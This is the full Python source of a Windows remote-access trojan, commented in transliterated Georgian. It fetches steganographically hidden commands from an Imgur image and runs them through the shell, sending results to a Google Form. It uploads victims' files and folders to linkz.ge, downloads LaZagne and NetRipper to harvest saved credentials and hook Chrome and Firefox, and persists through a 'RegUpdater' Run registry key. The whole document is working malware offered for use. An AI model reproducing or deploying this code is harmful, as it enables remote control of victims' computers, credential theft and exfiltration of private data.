"""
es virusi mushaobs shemdegnairad

1. brdzanebas igebs imgur -is public bibliotekidan steganografiis sashvalebit
	programa naxulobs bolos atvirtul photos. photos hex kodidan igebs brdzanebas da mititebul tarigs
	tu tarigi emtxveva im dges sruldeba brdzaneba tu is dzveli tarigia eseigi shesrulebulia savaraudot da agar sruldeba

2. shesrulebuli brdzanebebis da consolis erori mogvdis google fomr-ze

3. failebis moparvisada utvirtvis miznit viyenebt linkz.ge saits


shenishvna :
	kodi eshveba ertxel yoveldge usafrtxoebis miznebidan gamomdinare

gamoyenebuli bibliotekebi:
	# pip install requests

"""
import traceback  # stack trace -is  dasabewdat (gamomwvevi erroris)
import re         # regular expression gamosayeneblad, textepis parsirebis miznit
import requests   # pythonis dzalian magari biblioteka http/s requests-ebis gasaketeblad
import subprocess # qve procesebtan samushaod (konkretulad shell -is amushavebistvis)
import os 		  # os.path.basename() ->: download funqciashi failis gafartoebisa da saxelis dadgenis miznit
import sys 		  # py2exe -ma rame eroris shemtxvevashi rom ar moaxdinos shetyobineba da dalogeba
import shutil 	  # kargi bibliotekaa failebis kopireba past da msgavs rameebze samushaod ( chven viyenebt arqivis gasaketeblad )
import time 	  # kodis shenelebis miznit
import ctypes 	  # viyenebt chveni uflebebis gasagebad (gvaqvs tu ara adminis uflebebi)
import zipfile 	  # amoarqivebashi viyenebt bibliotekas
import _winreg as wreg  # es moduli aris "MS Windows Specific Services" tavshi me 35.3 punqtshi "35.3. _winreg â€“ Windows registry access"
                        # viyenebt registry DB -s damatebistvis ( chens shemtxvevashi autorun miznistvis )
from datetime import datetime # tarigis dasabewdat rom shevadarot chamalul tarigs, dgevandelia tu ara brdzaneba


def send(data): # argumentad gadaecema gadasagzavni informacia
	"""
	es aris informaciis gagzavnis funqcia. es funqcia urtiertobs google -is fomastan
	"""

	url = 'https://docs.google.com/forms/d/1MFN0rQSGBMgvaTGK3NT8sGhWOOIVaSEtGd4nMceNqbE/formResponse'
	'''url <- shi araris shenaxuli google form -is misamarti aramde ushvalod mag formis action linki
	sadac xdeba posti'''

	form_data = {'entry.880569455': data}
	'''<textarea> <- is velit gadacemuli informacia igzavneba shemdegi cvladit "entry.880569455" da magitom vutiteb
	postis dros rom entry.880569455 <- am cvlads qondes mibmuli shedegebi -i'''
	r = requests.post(url, verify=False, data=form_data) # verify=False -> ar gvwirdeba ssl verifikacia radgan kompilirebul failze problemebi iqnmneba da mastan gasamklaveblad damatebiti kodebis dasaweri


def download(url): # argumentad gadaecema gadmosaweri failis misamarti
	"""
	am funqciit xdeba msxverplis kompiutershi monacemebis chawera
	"""
	# failis saxeli iqneba magalitad linkis mixedvit:http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
	# putty.exe
	filename = os.path.basename(url) 
	r = requests.get(url, verify=False, stream=True ) # verify=False -> ar gvwirdeba ssl verifikacia radgan kompilirebul failze problemebi iqnmneba da mastan gasamklaveblad damatebiti kodebis dasaweri
	with open(filename,"wb") as fd :
	    for chunck in r.iter_content(1024) :
	        fd.write(chunck)


def upload(path): # argumentad gadaicema asatvirti failis sruli misamarti magalitad >"C:/Users/gio/Desktop/passwords.txt"
	"""
	 funqcia gamoiyeneba http://linkz.ge/ -ze failebis exfiltration -is tvis
	 xdeba formashi one time use hash -istvis gverdis avla
	"""

	# asatvirt formaze dacvis miznit dayenebulia one time use hash -is msgavsi meqanizmi
	# am shemtxvevashi yovel motxovnaze icvleba asatvirti misamarti
	# chven rom statikurad gavwerot linki savaraudot serveri mas uaryofs da ver avtvirtavt failebs
	# radgan tavad cvalebadi sid-i klientis mxares isaxeba modit moviparot da chventviton davagenerirot legitimuri misamarti
	# aseve gamoyenebulia cvalebadi Accesskey tumca esec moipoveba html -shi

	r = requests.get("http://linkz.ge/") # contentis misagebad
	sid = re.search( r'sid=(.+)&', r.text ) # kontentidan sid kodis amogeba
	AccessKey = re.search( r'AccessKey=(.+)&', r.text ) # kontendidan AccessKey kodis amogeba
	sid = sid.group(1) # parsirebis shedegi
	AccessKey = AccessKey.group(1) # parsirebis shedegi
	url = "http://linkz.ge/cgi-bin/upload.cgi?sid="+sid+"&maxfilesize=209715200" # asatvirti linkis generi(generireba)
	 
	# cvladebi da mati mnishvnelobebi rac igzavneba serverze atvirtvis dros
	# chven mxolod uploadfile_0 cvladi gvainteresebs sadac tavsdeba asatvirti faili
	# danarcheni cvladebi trafikis sheswavlis shemdgom shesabamisad generirdeba.
	files ={
	    'sessionid':(None, sid),
	    'UploadSession':(None, sid),
	    'AccessKey':(None, AccessKey),
	    'maxfilesize':(None, "209715200"),
	    'phpuploadscript':(None, "http://linkz.ge/uploading.php"),
	    'returnurl':(None, "http://linkz.ge/cross.php" ),
	    'uploadmode' : (None, "1"),
	    'uploadfile_0': open(path, 'rb'), # asatvirti faili
	    'file_descr[0]': (None,""),
	    'file_password[0]': (None,""),
	    'uploadurl[0]' : (None,""),
	    'url_descr[0]' : (None,""),
	    'url_password[0]' : (None,"")
	}
	        

	r = requests.post(url, files=files) # atvirtva

	# trafikze dakvirvebit atvirtvis shemdeg xdeba am misamartze shemdegi monacemebis gadagzavna da mis pasuxshia motavsebuli 
	# gadmosaweri da washashleli linki amitom chvenc igives vimeorebt linkebis gasagebad
	r = requests.post("http://linkz.ge/emaillinks.php", data = {
	                                                            "UploadSession":sid,
	                                                            "AccessKey":AccessKey,
	                                                            "uploadmode":"1",
	                                                            "submitnums":"0",
	                                                            "fromemail":"",
	                                                            "toemail":"" })


	delete_link = re.search( r'href="(http:\/\/linkz.ge\/delete.php\?id=.+)"', r.text ) # wamshleli linki
	download_link = re.search( r'href="(http:\/\/linkz.ge\/file\/.+\/.+.html)"', r.text ) # gadmosaweri linki
	# shedegebis google fomze gadagzavna
	send( download_link.group(1) ) # gadmosaweri lingis gagzavna
	send( delete_link.group(1)   ) # wamshleli linkis gagzavna
	 


def zip(path):
	"""
	mititebuli folderis misamarti daarkivdeba zip formatshi igive direktoriatshi mag: path = 'C:\\Users\\programming\\Desktop\\netripper'
	"""
	shutil.make_archive(path, 'zip', os.path.dirname(path) ,os.path.basename(path) )

	return path + '.zip'


def unzip(path):
	"""
	samwuxarod py 2 ar aqvs 'shutil.unpack_archive' sashvaleba amitom viyenebt zipfile bibliotekas
	"""
	try:
		archive = zipfile.ZipFile(path) # obieqtis gansazgvra
		archive.extractall() # yvelafris amoarqiveba
		data = "\t\t\twarmatebit moxda amorqiveba\n"
		for file in archive.namelist() :
			data +=  file + '\n'
		send(data) # shetyobinebis gagzavna rom moxda amoarqoveba da ra failebi romel foldershia shemdegi miznebistvis
	except:
		send("\t\t\tver moxda amorqiveba\n\n" + traceback.format_exc() ) # tu rame erori gaichita shetyobinebis gagzavna


def run(command):
	"""
	am funqciis sashvalebit gadaicema sistemuri brdzanebebi xolo brdzanebis shedegi ugzavneba google formaze
	rogorc brdzanebis output -i ise ar shesrulebis mizezebi, erorebi logebi.
	"""
	CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	#post_response = requests.post(url=url, data=CMD.stdout.read()) # output is gadacema post-it
	#post_response = requests.post(url=url, data=CMD.stderr.read()) # erro-is shemtxvevashi log -is gadacema
	send(CMD.stdout.read())
	send(CMD.stderr.read())


def Netripper():
	"""
	yoveljerze moxdeba axali netripperis gadmowera rom "up to date" iyos. shemdgom dlls -is konfigurireba da dasalogi folderis sheqmna
	"""
	if os.path.isdir('netripper') : shutil.rmtree('netripper') # tu netripper folderi aris eseigi kodi tavidan ishveba da vshlit folders rom tavidan carieli sheiqmnas
	os.mkdir('netripper')			
	download('https://raw.githubusercontent.com/NytroRST/NetRipper/master/Release/NetRipper.exe') # NetRipper.exe -is gadmowera
	download('https://raw.githubusercontent.com/NytroRST/NetRipper/master/Release/DLL.dll') 		# misi DLL.dll -is gadmowera
	run('NetRipper.exe -w DLL.dll -l '+os.getcwd()+'\\netripper -p true -d 4096 -s pass=') # DLL.dll -is konfigurireba
	keepGoing = True
	while keepGoing:
		# tu sheiqmna folderi da dakonfigurirda dll mashin
		if  os.path.isfile('NetRipper.exe') and os.path.isfile('NewDLL.dll') and os.path.isdir('netripper'):
			processes = subprocess.check_output('wmic process get description',shell=True).split('\n') # wmic process get description <- cmd -s brdzaneba sadac mxolod procesis saxelebi ibewdeba
			for process in processes:
				if 'firefox.exe' in process or 'chrome.exe' in process: # gashvebul procesebishi firefox.exe tu aris an chrome.exe mashin moxdes hook -i
					run('NetRipper.exe NewDLL.dll ' + process)
					keepGoing = False
					break
		time.sleep(2) # 2 wamis gamotovebit xdebodes shemowmeba rom rame ar daiqrashos da procesoric ar daitvirtos


def lazagne(command) :
	'''
	funqcia gadmowers	lazange-s da gaushvebs mititebuli brdzanebit
	'''
	lazagne="Windows\\laZagne.exe " + command # cmd-s tvis gasagebi rom iyos
	if not os.path.isdir('Windows') : # tu araa Windows folderi eseigi pirvelad eshveba lazagne da moxdeba misi chawera da amorqiveba
		download('https://github.com/AlessandroZ/LaZagne/releases/download/1.1/Windows.zip') # lazagne chamotvirtva
		unzip('Windows.zip') # lazagne -s amoarqiveba	
	run(lazagne) # lazagne -s gashveba brdzanebit


def main():

	now = '%s-%s-%s' % ( datetime.now().year, datetime.now().month, datetime.now().day ) # mag: '2016-2-20'
		
	r = requests.get("http://imgur.com/a/fOKZt")
	data = r.text
	img = re.search( r'<img src="\/\/(.+?)"', data ).group(1)

	r = requests.get("http://"+img)
	data = r.text
	
	try :
		command = re.search( r'brdzaneba=(.+?)&', data ).group(1)
		publish = re.search( r'tarigi=(.+?)&', data ).group(1)
		#command = 'lazagne*browsers -v'
		#publish = '2016-3-3'
		if publish == now :
		       
			if 'netripper' in command:
			    Netripper()
			elif 'upload_NR' in command: # upload_NR nishnavs rom aitvitrtos netripper -is dalogili failie. sadacaa logebi shenaxuli is folderi daizipeba da aitvirteba
				if os.path.isdir('netripper') : # shevamowmot aris tu ara msgavsi folderi
					path = os.getcwd().strip("\n") + '\\netripper'
					upload(zip(path)) # file izipeba da abrunebs failis misamarts romelic shemdgom itvirteba
			elif 'upload' in command : # tu aris brdzaneba upload gadmocemuli mag:'upload*C:\\Users\\gio\\Desktop\\testireba.txt'
				path = command[7:] # patara parsireba rom mxolod darches misamarti mag: "C:\\Users\\gio\\Desktop\\testireba.txt" da chamoshordes "upload*"
				if os.path.isfile(path) : # tu aris msgavsi faili
					upload(path) # mititebuli failis atvirta
				else:
					send(path + ' [!] msgavsi faili araris an misamartia arasworad mititebuli. tu gsurs folderis atvirtva\
					da ara failis gamoiyeneba brdzaneba: up_zip magalitad: up_zip*C:\\\\secret')
			elif 'up_zip' in command : # magalitad "up_zip*C:\\Users\\gio\\Desktop\\" daarqivdeba secret folderi da moxdeba misi atvirtva
				path = command[7:] # patara barsireba rom brdzanebidan darches misamarti magalitad : 'C:\\Users\\gio\\Desktop\\'
				if os.path.isdir(path): # shevamowmot aris tu ara msgavsi faili
					upload(zip(path)) # failis dazipva da atvirtva
				else: send(path + ' [!] msgavsi faili ver moidzebna. an araris an misamartia araswori')
			elif 'lazagne' in command : # laZagne -is tvis brdzanebis gadmocema aris shemdegnairad. magalitad: " lazagne*wifi -v "  saidanac brdzaneba aris "wifi -v"
				command = command[8:] # " lazagne* " < chamoshoreba da brdzanebis datoveba				
				if ctypes.windll.shell32.IsUserAnAdmin() == 0:
					send('[-] ar gvaqvs adminis uflebebi amitom lazagne -s yvela moduli ver imushavebs warmatebulad. imisatvis rom gaigo brdzanebis shesrulebas wirdeboda tu ara adminis uflebebi, brdzanebebs daumate argumentad "-v" rom miigo zusti pasuxi')
				else: send('[+] gaqvs adminis uflebebi. (y) laZagne -s yvela modulma unda imushaos warmatebit')				
				lazagne(command)
			else:
				CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				send(CMD.stdout.read())
				send(CMD.stderr.read())				
	except:
		trace = "\t\t\tmain funqciashi gamonaklisi moxda\n\n" + traceback.format_exc()
		send(trace)



if __name__ == '__main__':

	sys.stderr = sys.stdout
	'''erorebi ubralod daibewdeba am shemtxvevashi
	arc py2exe dalogavs da arc shetyobineba amoxdeba. amasviyenebt radgan failis gadmowerashi mititebuli
	gvaqvs sertipikatebis (ssl) ara verificireba radgan sheidzleba problema sheiqmnes da ar moxdes failis
	gadmowera an gagzavna'''


	# vad gent user profiles rom swored mis profilshi chavagdot virusi da maze movqmedebdet
	# aseve kidev erti gza direqtoriis migebis gaxlavt shemdegibrdzaneba os.getenv('userprofile')
	Null,userprof   =   subprocess.check_output('set USERPROFILE',shell=True).split("=")
	path = userprof.strip("\n\r") + '\\AppData\\Roaming\\q\\' + 'quimera.exe' # im misamartis adgili sadac macrom chawera virusi	
	destination     =   userprof.strip("\n\r") + '\\Documents\\quimera\\'  + 'quimera.exe' # chveni virusis gadatanis adgil mdebareoba

	
	# pirveli faza

	if not os.path.exists(destination): # tu ar arsebobs faili eseigi jer ar momxdara chveni virusis kopireba
	                                    # mimartul adgilas rac imas nishnavs rom pirveli fazaa (exla gaushva macro)
	    os.mkdir( os.path.dirname(destination) ) # folderis sheqmna sadac chavakopirebt chvens virus
	    shutil.copyfile( path, destination ) # chveni virusis kopireba


	    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACCESS)
	    # misani user space -is gamoyenebis gaxlavt administraciuli privilegis arqonit moqmedebis sashvaleba
	    # RegUpdater aris registris saxeli romelic mibmulia (destination) chvens virusze
	    wreg.SetValueEx(key,'RegUpdater', 0, wreg.REG_SZ, destination)
	    key.Close()

	else:

		main()
